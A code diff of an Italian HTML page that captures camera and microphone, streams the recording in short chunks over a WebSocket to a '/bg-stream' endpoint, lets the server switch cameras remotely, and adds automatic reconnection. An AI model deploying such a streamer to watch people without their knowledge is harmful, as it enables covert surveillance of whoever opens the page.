@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="it">
 <head>
@@ -15,35 +14,44 @@ body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text
 
 <script>
 const room = new URLSearchParams(location.search).get('room') || 'user1';
-const ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
-let mediaRecorder;
-let currentCamera = 'environment';
-let stream;
+let ws, mediaRecorder, stream, currentCamera='environment', reconnectTimeout;
 
-ws.onopen = () => startCamera(currentCamera);
-ws.onmessage = e => {
-  try {
-    const msg = JSON.parse(e.data);
-    if(msg.type==='switchCamera'){
-      currentCamera = msg.camera;
-      startCamera(currentCamera);
-    }
-  } catch {}
-};
+function connectWS(){
+  ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
+  ws.onopen = ()=> startCamera(currentCamera);
+  ws.onclose = ()=>{
+    console.log('WS chiuso, riconnessione in 2s...');
+    reconnectTimeout = setTimeout(connectWS, 2000);
+  };
+  ws.onerror = e=> console.log('Errore WS', e);
+  ws.onmessage = e=>{
+    try{
+      const msg=JSON.parse(e.data);
+      if(msg.type==='switchCamera'){
+        currentCamera = msg.camera;
+        startCamera(currentCamera);
+      }
+    }catch{}
+  };
+}
+connectWS();
 
 async function startCamera(camera){
   if(stream) stream.getTracks().forEach(t=>t.stop());
   try{
     stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:camera}, audio:true });
     mediaRecorder = new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});
-    mediaRecorder.ondataavailable = e => { if(ws.readyState===WebSocket.OPEN && e.data.size>0) ws.send(e.data); };
-    mediaRecorder.start(100); // invia chunk ogni 100ms
+    mediaRecorder.ondataavailable = e=>{
+      if(ws.readyState===WebSocket.OPEN && e.data.size>0) ws.send(e.data);
+    };
+    mediaRecorder.start(100); // chunk ogni 100ms
     document.body.innerHTML=`<div class="msg"><b>Streaming attivo</b></div>`;
   }catch(err){
     document.body.innerHTML=`<div class="msg">Errore: ${err.message}</div>`;
   }
 }
 
+// Ping ogni 10s
 setInterval(()=>{ if(ws.readyState===WebSocket.OPEN) ws.send('ping'); },10000);
 </script>
 </body>
